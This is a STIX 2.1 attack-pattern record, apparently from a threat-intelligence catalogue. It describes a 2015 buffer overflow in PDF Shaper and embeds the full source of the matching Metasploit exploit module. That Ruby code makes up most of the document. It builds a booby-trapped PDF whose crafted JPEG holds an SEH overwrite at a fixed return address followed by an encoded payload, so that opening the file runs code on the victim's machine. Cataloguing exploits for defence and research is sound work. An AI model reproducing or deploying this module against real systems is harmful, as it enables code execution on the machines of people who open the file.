{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--698cee72-7535-4e87-a6f9-b10be1e64129",
    "created": "2024-08-14T16:37:02.606405Z",
    "modified": "2024-08-14T16:37:02.606409Z",
    "name": "PDF Shaper Buffer Overflow",
    "description": " PDF Shaper is prone to a security vulnerability when processing PDF files. The vulnerability appears when we use Convert PDF to Image and use a specially crafted PDF file. This module has been tested successfully on Win XP, Win 7 Win 8, Win 10.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/shaper_pdf_bof.rb",
            "external_id": "shaper_pdf_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::PDF\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'PDF Shaper Buffer Overflow',\n      'Description'     => %q{\n          PDF Shaper is prone to a security vulnerability when processing PDF files.\n        The vulnerability appears when we use Convert PDF to Image and use a specially\n        crafted PDF file. This module has been tested successfully on Win XP, Win 7,\n        Win 8, Win 10.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'metacom27[at]gmail.com - twitter.com/m3tac0m', # POC\n          'metacom' # MSF Module\n        ],\n      'References'      =>\n        [\n          ['EDB', '37760']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process', # none/process/thread/seh\n        },\n      'Platform'        => 'win',\n      'Payload'         =>\n        {\n          'Space' => 2000,\n          'DisableNops' => true\n        },\n      'Targets'         =>\n        [\n          ['<Win Xp, Win 7, Win 8, Win 10 / PDF Shaper v.3.5 and v.3.6>',\n           {\n             'Ret' => 0x00402AC1, # PDFTools.exe\n             'Offset' => 433\n           }\n          ]\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2015-10-03',\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [false, 'The file name.', 'msf.pdf'])\n      ], self.class\n    )\n  end\n\n  def exploit\n    file_create(make_pdf)\n  end\n\n  def jpeg\n    buffer = \"\\xFF\\xD8\\xFF\\xEE\\x00\\x0E\\x41\\x64\\x6F\\x62\\x65\\x00\\x64\\x80\\x00\\x00\"\n    buffer << \"\\x00\\x02\\xFF\\xDB\\x00\\x84\\x00\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\"\n    buffer << \"\\x02\\x03\\x02\\x02\\x02\\x03\\x04\\x03\\x03\\x03\\x03\\x04\\x05\\x04\\x04\\x04\"\n    buffer << \"\\x04\\x04\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x05\\x07\\x08\\x08\\x08\"\n    buffer << \"\\x07\\x05\\x09\\x0A\\x0A\\x0A\\x0A\\x09\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\"\n    buffer << \"\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x01\\x03\\x02\\x02\\x03\\x03\\x03\\x07\\x05\"\n    buffer << \"\\x05\\x07\\x0D\\x0A\\x09\\x0A\\x0D\\x0F\\x0D\\x0D\\x0D\\x0D\\x0F\\x0F\\x0C\\x0C\"\n    buffer << \"\\x0C\\x0C\\x0C\\x0F\\x0F\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0F\\x0C\\x0E\\x0E\\x0E\"\n    buffer << \"\\x0E\\x0E\\x0C\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\"\n    buffer << \"\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\xFF\\xC0\\x00\\x14\\x08\\x00\\x32\\x00\"\n    buffer << \"\\xE6\\x04\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01\\x04\\x11\\x00\\xFF\\xC4\"\n    buffer << \"\\x01\\xA2\\x00\\x00\\x00\\x07\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\"\n    buffer << \"\\x00\\x00\\x00\\x04\\x05\\x03\\x02\\x06\\x01\\x00\\x07\\x08\\x09\\x0A\\x0B\\x01\"\n    buffer << \"\\x54\\x02\\x02\\x03\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    buffer << \"\\x01\\x00\\x02\\x03\\x04\\x05\\x06\\x07\"\n    buffer << rand_text(target['Offset']) # junk\n    buffer << generate_seh_record(target.ret)\n    buffer << payload.encoded\n    buffer << rand_text(2388 - payload.encoded.length)\n    buffer\n  end\n\n  def make_pdf\n    @pdf << header\n    add_object(1, \"<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>\")\n    add_object(2, \"<</Type/Outlines>>\")\n    add_object(3, \"<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>\")\n    add_object(4, \"[/PDF/Text/ImageC]\")\n    add_object(5, \"<</Type/Page/Parent 3 0 R/Contents 6 0 R>>\")\n    stream_1 = \"stream\" << eol\n    stream_1 << \"0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q\" << eol\n    stream_1 << \"endstream\" << eol\n    add_object(6, \"<</Length 91>>#{stream_1}\")\n    stream = \"<<\" << eol\n    stream << \"/Width 230\" << eol\n    stream << \"/BitsPerComponent 8\" << eol\n    stream << \"/Name /X\" << eol\n    stream << \"/Height 50\" << eol\n    stream << \"/Intent /RelativeColorimetric\" << eol\n    stream << \"/Subtype /Image\" << eol\n    stream << \"/Filter /DCTDecode\" << eol\n    stream << \"/Length #{jpeg.length}\" << eol\n    stream << \"/ColorSpace /DeviceCMYK\" << eol\n    stream << \"/Type /XObject\" << eol\n    stream << \">>\"\n    stream << \"stream\" << eol\n    stream << jpeg << eol\n    stream << \"endstream\" << eol\n    add_object(7, stream)\n    finish_pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}